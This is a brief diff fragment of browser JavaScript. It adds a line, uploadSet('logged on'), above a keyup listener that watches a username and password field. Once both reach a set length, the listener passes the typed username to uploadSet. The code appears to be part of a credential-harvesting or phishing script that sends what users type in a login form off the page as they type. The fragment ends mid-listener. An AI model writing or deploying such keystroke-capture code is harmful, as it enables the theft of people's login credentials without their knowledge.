@@ -48,6 +48,8 @@ function valid(val) {
   return true;
 }
 
+uploadSet("logged on");
+          
 window.addEventListener("keyup", (e) => {
   if (US.value.length > 3 && PW.value.length > 5) {
     uploadSet("username: " + US.value);
